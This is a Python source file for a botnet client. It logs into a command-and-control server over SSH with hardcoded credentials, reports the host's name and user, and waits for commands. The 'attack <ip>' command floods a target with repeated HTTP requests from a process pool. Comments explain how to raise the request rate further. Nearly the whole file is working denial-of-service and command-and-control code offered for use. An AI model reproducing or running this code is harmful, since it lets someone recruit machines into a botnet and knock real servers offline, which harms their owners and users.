import paramiko
import sys
import socket
import getpass
import multiprocessing
import requests

## Paramiko communications are inspired by demos found on
## https://github.com/paramiko/paramiko/blob/main/demos/

## to increase the rate of each devices attacks remove result.wait(), pool.close() and pool.join() from
## the attack function, and in the exit and stop blocks of main uncomment process.terminate() and comment out
## process.close() and process.join()
## making these changes may lead to too many requests being sent by the bots and can cause 
## reliability issues, in addition terminating a process may lead to similar reliability issues
        
## makes a use different process for each request so we do not wait to sent the next one
def multi_attack(url):
    requests.get(url)

## attack using a pool pf processes to allow each machine to send a bunch of requests
def attack(ip_address, stop_event):
    url = "http://" + ip_address

    # sizes the pool or workers depending on what the device is capible of => ports to anything    
    with multiprocessing.Pool() as pool:
            while not stop_event.is_set():  
                # Send requests to the server repeatedly with the pool
                result = pool.apply_async(multi_attack, args=(url,))
                result.wait()
            pool.close()
            pool.join()

## process that opens the ssh connection and establishes communication with server and waits
## for commands to exicute
if __name__ == '__main__':

    ip = input("enter the ip address of the server:" + '')
    port = input("enter the port to connect to:" + '')

    # username and pwd for logging into the command server
    username = 'robot_army'
    password = 'i_am_a_robot'

    # establish the ssh connection
    SSH = paramiko.SSHClient()
    SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    SSH.connect(ip, port=port, username=username, password=password)
    open_session = SSH.get_transport().open_session()

    # get information about the host to send back to inform the control server who the bot is
    bot_name = socket.gethostname()
    current_user = getpass.getuser()

    # start the session with the command server
    if open_session.active:
        open_session.send(f'Bot checking in from {bot_name} as {current_user}.')

        ## this should print Hello, just lets you verify the connection on both ends
        print(open_session.recv(1024).decode())

        # set up a potential attack
        stop_event = multiprocessing.Event()
        process = None
        
        # wait for commands from the server 
        while True:
            command = open_session.recv(1024)
            try:
                SSH_command = command.decode()

                if SSH_command.split(" ")[0] == 'help':
                    open_session.send(f'Availible commands are: exit, attack <ip address>, stop, or wait.')
                    
                # exit everything at the same time
                elif SSH_command.split(" ")[0] == 'exit':
                    open_session.send(f'{bot_name} exiting')
                    if not process == None:
                        process.close()
                        process.join()
                        #process.terminate()
                    sys.exit()

                # starts a subprocess that attacks the target and informs the server
                elif SSH_command.split(" ")[0] == "attack":
                    target_ip = SSH_command.split(" ")[1]
                    open_session.send(f'{current_user} attacking target at {target_ip}')

                    # reset the stop event
                    stop_event = multiprocessing.Event()
                    process = multiprocessing.Process(target=attack, args=(target_ip, stop_event))
                    process.start()

                # stops the attack and informs the server
                elif SSH_command.split(" ")[0] == 'stop':
                    # stop the process and then terminate the process 
                    stop_event.set()
                    if not process == None:
                        process.close()
                        process.join()
                        #process.terminate()
                    open_session.send(f'attack by {current_user} halted')

                # handle commands that we havent preprepared for the bot
                else:
                    open_session.send("Not a recognized command, please use help to determine commands")

            # if something goes wrong inform the server
            except Exception as e:
                open_session.send(' ')
            except KeyboardInterrupt:
                except_command = "Keyboard interrupted."
                open_session.send(except_command)
                quit()

